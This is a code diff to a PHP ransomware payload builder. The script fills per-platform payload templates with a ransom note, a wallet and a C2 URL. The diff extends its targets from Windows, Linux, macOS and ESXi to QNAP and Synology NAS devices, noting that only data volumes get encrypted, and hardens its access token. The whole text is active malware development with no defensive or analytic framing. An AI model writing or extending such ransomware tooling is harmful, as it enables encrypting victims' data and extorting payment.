@@ -38,7 +38,8 @@ $ransom = [
     'wallet'  => $rs('ransom_wallet'),
 ];
 
-$valid = ['win','linux','macos','esxi'];
+// NAS 只加密数据卷，绝不含系统分区
+$valid = ['win','linux','macos','esxi','qnap','synology'];
 if (!in_array($platform, $valid)) { echo json_encode(['ok'=>false,'msg'=>'无效平台']); exit; }
 
 $out_dir = __DIR__ . '/payloads';
@@ -49,8 +50,8 @@ $ts = date('Ymd_His');
 // 32 bit 可暴力枚举（且用随机名 302 跳登录页 = 静默失败），提到 128 bit。
 $tok = bin2hex(random_bytes(16));
 
-$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl','esxi'=>'esxi_payload.tpl'];
-$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py','esxi'=>'.sh'];
+$tpl_map = ['win'=>'win_payload.tpl','linux'=>'linux_payload.tpl','macos'=>'macos_payload.tpl','esxi'=>'esxi_payload.tpl','qnap'=>'qnap_payload.tpl','synology'=>'synology_payload.tpl'];
+$ext_map = ['win'=>'.cs','linux'=>'.py','macos'=>'.py','esxi'=>'.sh','qnap'=>'.sh','synology'=>'.sh'];
 $tpl_path = __DIR__ . '/templates/' . $tpl_map[$platform];
 
 if (!file_exists($tpl_path)) { echo json_encode(['ok'=>false,'msg'=>'模板文件缺失']); exit; }
@@ -69,7 +70,8 @@ if (file_exists($pub_path)) {
 
 // 构建勒索信文本
 $note = build_ransom_note($ransom, $platform, $c2_url);
-if ($platform === 'esxi') {
+if (in_array($platform, ['esxi','qnap','synology'], true)) {
+    // 三个平台都是 POSIX sh，模板里的字符串字面量用单引号，故转义规则相同
     // sh单引号字符串: 用'\''转义单引号，换行保留
     $note_esc = str_replace("'", "'\\''", $note);
     $tpl = str_replace('{{RANSOM_NOTE}}', $note_esc, $tpl);
